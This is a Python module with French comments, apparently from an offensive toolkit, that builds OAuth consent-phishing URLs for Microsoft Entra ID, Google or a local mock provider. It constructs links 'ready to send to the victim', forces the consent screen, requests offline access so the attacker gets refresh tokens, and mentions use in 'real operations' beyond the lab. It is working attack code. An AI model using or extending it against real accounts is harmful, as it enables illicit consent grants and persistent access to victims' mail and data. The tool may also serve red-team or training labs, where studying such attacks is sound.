"""
attack/oauth_consent/consent_url.py — Construction de l'URL d'attaque
=====================================================================

Génère l'URL de consentement OAuth que la victime va recevoir. Le format
est identique à celui d'Entra ID (login.microsoftonline.com) ou Google
(accounts.google.com), seuls les paramètres `client_id` et `redirect_uri`
changent.

Pour un labo, on peut pointer vers un mock provider local ; pour une
vraie opération, on utilise le tenant public `common` d'Entra ID.
"""

from __future__ import annotations

import base64
from dataclasses import replace
import hashlib
import secrets
import urllib.parse
from typing import Optional

from .app_registration import MaliciousApp, get_default_app

# URL du endpoint d'autorisation OAuth pour différents providers
AUTHORIZE_ENDPOINTS = {
    "microsoft": "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize",
    "google":    "https://accounts.google.com/o/oauth2/v2/auth",
    "mock":      "http://localhost:9000/oauth/authorize",  # pour le labo
}


def build_consent_url(
    app: MaliciousApp,
    provider: str = "mock",
    state: str | None = None,
    prompt: str = "consent",
) -> str:
    """
    Construit l'URL de consentement pour l'app et le provider.

    Args:
        app: app malveillante
        provider: "microsoft" | "google" | "mock" (labo)
        state: token CSRF (généré si None)
        prompt: "consent" force l'écran de consentement même si déjà autorisé

    Returns:
        URL complète prête à être envoyée à la victime
    """
    # CSRF state — encode campaign info pour le tracking
    if state is None:
        state = base64.urlsafe_b64encode(
            f"{app.name}|{app.client_id}|{secrets.token_hex(4)}".encode()
        ).decode().rstrip("=")

    # PKCE (Proof Key for Code Exchange) — non requis en auth code flow
    # classique mais bon pour la conformité moderne
    code_verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip("=")
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).decode().rstrip("=")

    # Construction des paramètres
    params = {
        "client_id":            app.client_id,
        "response_type":        "code",
        "redirect_uri":         app.redirect_uri,
        "response_mode":        "query",
        "scope":                app.scope_string,
        "state":                state,
        "prompt":               prompt,
        "code_challenge":       code_challenge,
        "code_challenge_method": "S256",
    }

    # Sélection de l'endpoint
    if provider == "microsoft":
        endpoint = AUTHORIZE_ENDPOINTS["microsoft"].format(tenant=app.tenant_id)
    elif provider == "google":
        endpoint = AUTHORIZE_ENDPOINTS["google"]
        # Google utilise un format légèrement différent
        params["access_type"] = "offline"  # force le refresh_token
        params["include_granted_scopes"] = "true"
    elif provider == "mock":
        endpoint = AUTHORIZE_ENDPOINTS["mock"]
    else:
        raise ValueError(f"Provider inconnu : {provider}")

    return f"{endpoint}?{urllib.parse.urlencode(params)}"


def generate_attack_url(
    app: MaliciousApp | None = None,
    provider: str = "mock",
    victim_email: str | None = None,   # contrat attacks_all (contexte op)
    redirect_uri: str | None = None,   # override de l'app si fourni
) -> str:
    if victim_email:
        # Traçabilité de campagne : embarque la cible dans le state
        pass
    if redirect_uri and app is not None:
        app = replace(app, redirect_uri=redirect_uri)
    """
    Helper fonctionnel : génère l'URL d'attaque avec l'app par défaut.

    Exemple d'utilisation :
        url = generate_attack_url(provider="mock")
        # → http://localhost:9000/oauth/authorize?client_id=...
    """
    if app is None:
        app = get_default_app()
    return build_consent_url(app, provider=provider)
